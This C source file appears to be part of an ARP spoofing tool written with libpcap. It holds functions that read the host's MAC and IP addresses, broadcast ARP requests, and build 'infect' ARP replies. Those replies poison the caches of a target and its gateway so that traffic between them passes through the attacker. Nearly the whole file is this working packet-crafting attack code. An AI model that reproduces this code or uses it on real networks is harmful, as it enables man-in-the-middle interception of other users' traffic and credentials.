#include "arpheader.h"

void sendBroadcast(char *argv[], pcap_t *pcap_handle, u_int8_t type)
{
      u_int8_t pkt[PACKETSIZE];
      insertPacketField(pkt, argv, type);

      if (pcap_sendpacket(pcap_handle, pkt, sizeof(pkt)) == -1)
            printf(" error\n");
      else
            printf("BroadCast success \n");
}

int compareMac(u_int8_t *mac1, u_int8_t *mac2)
{
      return memcmp(mac1, mac2, 6);
}

void insertFixedField(u_int8_t *pkt, u_int8_t opcode)
{
      struct eth_arp_header *send_packet = (struct eth_arp_header *)pkt;
      send_packet->type = ntohs(0x0806);
      send_packet->hd_type = ntohs(0x0001);
      send_packet->protocol_type = ntohs(0x0800);
      send_packet->hd_size = 0x06;
      send_packet->protocol_size = 0x04;
      send_packet->opcode = opcode == ARPOP_REQUEST ? ntohs(0x0001) : ntohs(0x0002);
}

void insertPacketField(u_int8_t *pkt, char *argv[], u_int8_t type)
{
      struct eth_arp_header *send_packet = (struct eth_arp_header *)pkt;

      insertFixedField(pkt, ARPOP_REQUEST);

      memcpy(send_packet->eth_dst_mac, broadcast_mac, 6);
      memcpy(send_packet->eth_src_mac, mymac, 6);

      memcpy(send_packet->arp_sender_mac, mymac, 6);
      send_packet->arp_sender_ip = type == TARGET ? inet_addr(argv[3]) : inet_addr(myip);
      memcpy(send_packet->arp_target_mac, broadcast_mac, 6);
      send_packet->arp_target_ip = type == TARGET ? inet_addr(argv[2]) : inet_addr(argv[3]);
}

void insertInfectPacketField(u_int8_t *pkt, void *arg, char current)
{
      struct eth_arp_header *infect = (struct eth_arp_header *)pkt;
      struct infect_addr_save *infect_addr_save = (struct infect_addr_save *)arg;

      insertFixedField(pkt, ARPOP_REPLY);

      if (current == TARGET)
      {
            memcpy(infect->eth_dst_mac, infect_addr_save->save_target_mac, 6);
            infect->arp_sender_ip = infect_addr_save->save_gateway_ip;
            memcpy(infect->arp_target_mac, infect_addr_save->save_target_mac, 6);
            infect->arp_target_ip = infect_addr_save->save_target_ip;
            current = GATEWAY;
      }
      else
      {
            memcpy(infect->eth_dst_mac, infect_addr_save->save_gateway_mac, 6);
            infect->arp_sender_ip = infect_addr_save->save_target_ip;
            memcpy(infect->arp_target_mac, infect_addr_save->save_gateway_mac, 6);
            infect->arp_target_ip = infect_addr_save->save_gateway_ip;
            current = TARGET;
      }

      memcpy(infect->eth_src_mac, mymac, 6);
      memcpy(infect->arp_sender_mac, mymac, 6);
}

void getMyMacIp(char *dev)
{
      struct ifreq ifr;
      int ss = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

      strcpy(ifr.ifr_name, dev);

      if (ioctl(ss, SIOCGIFHWADDR, &ifr) < 0)
            printf("Mac Address 구하지 못힘 \n");
      else
            memcpy(mymac, ifr.ifr_addr.sa_data, 6);

      if (ioctl(ss, SIOCGIFADDR, &ifr) < 0)
            printf("아이피 구하지 못힘 \n");
      else
            inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, myip, sizeof(struct sockaddr));
}